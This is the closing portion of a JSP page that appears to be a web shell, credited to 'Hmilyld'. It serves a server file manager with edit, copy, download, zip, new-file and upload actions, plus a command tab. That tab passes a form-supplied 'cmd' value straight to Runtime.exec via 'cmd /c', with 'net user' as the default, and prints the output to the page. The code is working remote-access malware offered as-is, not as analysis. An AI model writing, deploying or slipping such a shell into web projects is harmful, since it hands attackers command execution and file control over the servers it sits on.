										out.println(sbEdit.toString());
									} else if (strAction != null && strAction.equals("copy")) {
										out.println(sbCopy.toString());
									} else if (strAction != null && strAction.equals("down")) {
										out.println(sbDown.toString());
									} else if (strAction != null && strAction.equals("savecopy")) {
										out.println(sbSaveCopy.toString());
									} else if (strAction != null && strAction.equals("newFile")
											&& !sbNewFile.toString().equals("")) {
										out.println(sbNewFile.toString());
									} else if( strAction!=null && "zipFolder".equals(strAction)){
										out.println(sbZip.toString());
									} else {
										out.println("操作信息提示");
									}
							%></td>
								</tr>
								<tr bgcolor="#E7e7e6">
									<td width="26%"><%=strFileName[languageNo]%></td>
									<td width="19%"><%=strFileSize[languageNo]%></td>
									<td width="29%"><%=strLastModified[languageNo]%></td>
									<td width="26%"><%=strFileOperation[languageNo]%></td>
								</tr>
								<%=sbFile%>
							</table>
						</td>
					</tr>
					<tr>
						<td colspan=2 bgcolor=#B1CCEA>
							<form name="frmMake" action="" method="post" class="form1">
								<input type="hidden" name="action" value="newFile">
								<input type="hidden" name="path" value="<%=strDir%>">
								<input type="hidden" name="file" value="<%=strFile%>">
								<input type="hidden" name="cmd" value="<%=strCmd%>">
								<input type="hidden" name="tabID" value="1">
								<input type="hidden" name="content" value="">
								<%
									if (!strDir.endsWith("\\"))
											strDir = strDir + "\\";
								%>
								<input type="text" name="fileName" size=36 value="<%=strDir%>">
								<input type="submit" name="btnNewFile"
									value="<%=strCreateFile[languageNo]%>"
									onclick="frmMake.submit()">
								<input type="submit" name="btnNewDir"
									value="<%=strCreateFolder[languageNo]%>"
									onclick="frmMake.submit()">
							</form>
							<form name="frmUpload" enctype="multipart/form-data" action=""
								method="post" class="form1">
								<input type="hidden" name="action" value="upload">
								<input type="hidden" name="path" value="<%=strDir%>">
								<input type="hidden" name="file" value="<%=strFile%>">
								<input type="hidden" name="cmd" value="<%=strCmd%>">
								<input type="hidden" name="tabID" value="1">
								<input type="hidden" name="content" value="">
								<input type="file" name="cqqUploadFile" size="36">
								<input type="submit" name="submit"
									value="<%=strUpload[languageNo]%>">
							</form>
						</td>
					</tr>
				</table>
			</div>
			<div id="menu2" class="tabcontent">
				<%
					String line = "";
						StringBuffer sbCmd = new StringBuffer("");

						if (strCmd != null) {
							try {
								//out.println(strCmd);
								Process p = Runtime.getRuntime().exec(
										"cmd /c " + strCmd);
								BufferedReader br = new BufferedReader(
										new InputStreamReader(p.getInputStream()));
								while ((line = br.readLine()) != null) {
									sbCmd.append(line + "\r\n");
								}
							} catch (Exception e) {
								System.out.println(e.toString());
							}
						} else {
							strCmd = "net user";
						}
				%>
				<form name="cmd" action="" method="post">
					<input type="text" name="cmd" value="<%=strCmd %>" size=50>
					<input type="hidden" name="tabID" value="2">
					<input type=submit name=submit value="<%=strExecute[languageNo]%>">
				</form>
				<%
					if (sbCmd != null
								&& sbCmd.toString().trim().equals("") == false) {
				%>
				<TEXTAREA NAME="cqq" ROWS="20" COLS="100%"><%=sbCmd.toString()%></TEXTAREA>
				<%}%>
			</DIV>
		</div>
		<%
			}
		%>
		<div align="center" Style="margin: 5px;">
			<a href="http://www.whylover.com" target="_blank">www.hmilyld.cn</a> By Hmilyld修改
		</div>
	</body>
</html>
